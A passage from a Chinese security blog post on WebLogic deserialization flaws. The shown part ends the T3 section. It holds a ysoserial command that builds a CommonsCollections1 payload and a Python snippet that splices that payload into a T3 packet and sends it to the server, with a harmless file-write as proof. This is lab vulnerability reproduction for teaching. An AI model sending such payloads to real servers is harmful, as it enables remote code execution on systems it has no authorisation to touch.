"t3 10.3.6</span><br><span class="line">AS:255</span><br><span class="line">HL:19</span><br><span class="line"></span><br><span class="line">"</span><br><span class="line">received "HELO"</span><br></pre></td></tr></tbody></table></figure><p>看到返回数据正常</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#一定不要用PowerShell运行！！！</span><br><span class="line">java -jar .\ysoserial-all.jar CommonsCollections1 "touch /hacked_by_tunan.txt" &gt; payload.bin</span><br></pre></td></tr></tbody></table></figure><p>生成恶意序列化对象，替换原来的序列化对象</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 第三个参数传入一个文件名，在本例中为刚刚生成的“payload.bin”</span><br><span class="line">payloadObj = open(sys.argv[3],'rb').read()</span><br><span class="line"># 复制自原数据包，T3协议头部分，00000611直到fe010000</span><br><span class="line">t3_header=binascii.a2b_hex('000006110665000......537475627009fe010000')</span><br><span class="line"># 要替换的Payload(替换一个序列化对象)</span><br><span class="line">payload=t3_header+payloadObj</span><br><span class="line"># 复制剩余数据包</span><br><span class="line">payload=payload+binascii.a2b_hex('fe010000aced00057372001d77656......707702000078fe00ff')</span><br><span class="line"># 重新计算数据包大小并替换原数据包中的前四个字节</span><br><span class="line">payload = struct.pack('!i', len(payload)) + payload[4:]</span><br><span class="line"></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></tbody></table></figure><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457826_643902a226d50fb96ece0.png!small" alt="image-20230406151714118.png"></p><p>可以看到恶意文件已经被写入根目录下。</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.s8ark.top">s8ark</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.s8ark.top/2023/04/14/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://blog.s8ark.top/2023/04/14/初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.s8ark.top" target="_blank">少年锦时</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/weblogic/">weblogic</a></div><div class="post_share"><div class="social-share" data-image="https://image.3001.net/images/20230414/1681459367_643908a71137d54153e81.png!" data-sites="wechat,qq,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://unpkg.com/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media=&quot;all&quot;"><script src="https://unpkg.com/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/25/%E5%AE%9E%E6%88%98%E4%BD%BF%E7%94%A8TurboIntruder%E5%AF%BB%E6%89%BE%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="https://image.3001.net/images/20230425/1682392793_644746d95ed5c4c6e6faa.png" onerror="onerror=null,src=&quot;/img/404.jpg&quot;" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">实战|使用Turbo Intruder寻找短信轰炸漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/07/Burpsuite%E5%AE%89%E8%A3%85Turbo%20Intruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/"><img class="next-cover" src="https://s11.ax1x.com/2024/02/03/pFQ4tiD.jpg" onerror="onerror=null,src=&quot;/img/404.jpg&quot;" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Burpsuite安装Turbo Intruder插件报错问题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457/" title="CC链学习笔记-CC2457"><img class="cover" src="https://s11.ax1x.com/2024/02/12/pF8AWQS.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC2457</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE/" title="CC链学习笔记-CC1链"><img class="cover" src="https://s11.ax1x.com/2024/02/12/pF8AIds.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC1链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3%E9%93%BE/" title="CC链学习笔记-CC3链"><img class="cover" src="https://s11.ax1x.com/2024/02/12/pF8A5Zj.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC3链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE/" title="CC链学习笔记-CC6链"><img class="cover" src="https://s11.ax1x.com/2024/02/12/pF8AhLQ.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC6链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="CC链学习笔记-前置知识"><img class="cover" src="https://s11.ax1x.com/2024/02/12/pF8Aoon.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-前置知识</div></div></a></div><div><a href="/2023/06/26/%E4%B8%80%E6%96%87%E5%AD%A6%E4%BC%9ARocketMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2023-33246)/" title="一文学会RocketMQ远程命令执行漏洞(CVE-2023-33246)"><img class="cover" src="https://s11.ax1x.com/2024/02/03/pFlPheP.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-26</div><div class="title">一文学会RocketMQ远程命令执行漏洞(CVE-2023-33246)</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null,this.src=&quot;/img/friend_404.gif&quot;" alt="avatar"></div><div class="author-info__name">s8ark</div><div class="author-info__description">但行好事，莫问前程</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://space.bilibili.com/471790025" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_41401434" target="_blank" title="csdn"><i class="iconfont icon-csdn"></i></a><a class="social-icon" href="https://www.zhihu.com/people/yu-ji-4-35-17" target="_blank" title="知乎"><i class="iconfont icon-shejiaotubiao-10"></i></a><a class="social-icon" href="https://github.com/feiweiliang" target="_blank" title="Github"><i class="iconfont icon-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFweb%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">1.什么是web中间件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-weblogic%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">2.weblogic环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">3.XMLDecoder反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8BSAX%E8%A7%84%E8%8C%83"><span class="toc-number">3.1.</span> <span class="toc-text">下面介绍一下SAX规范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-3506"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现(CVE-2017-3506)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">XMLDecoder反序列化流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-CVE-2017-10271"><span class="toc-number">3.6.</span> <span class="toc-text">绕过(CVE-2017-10271)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.7.</span> <span class="toc-text">再次修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99POC"><span class="toc-number">3.8.</span> <span class="toc-text">编写POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">4.T3反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E4%BC%BC%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">相似概念总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebLogic-RMI"><span class="toc-number">4.2.</span> <span class="toc-text">WebLogic RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background:0 0"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By s8ark</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/#/Integrated/index" style="color:#fff" target="_blank"><img src="https://img.shields.io/badge/%E5%86%80ICP%E5%A4%87-2022029585%E5%8F%B7--1-yellow" alt="冀ICP备2022029585号-1"></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span> 数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://unpkg.com/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'D8nose2CIyOjFl8XPfDeFNy6-gzGzoHsz',
      appKey: '2i3KumjG4kgQlX0YoU53eStd',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://unpkg.com/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/jquery.js"></script><script src="/js/foot.js"></script><script async="" src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><script id="click-show-text" src="https://unpkg.com/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async=""></script><link rel="stylesheet" href="https://unpkg.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media=&quot;all&quot;"><script src="https://unpkg.com/aplayer/dist/APlayer.min.js"></script><script src="https://unpkg.com/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>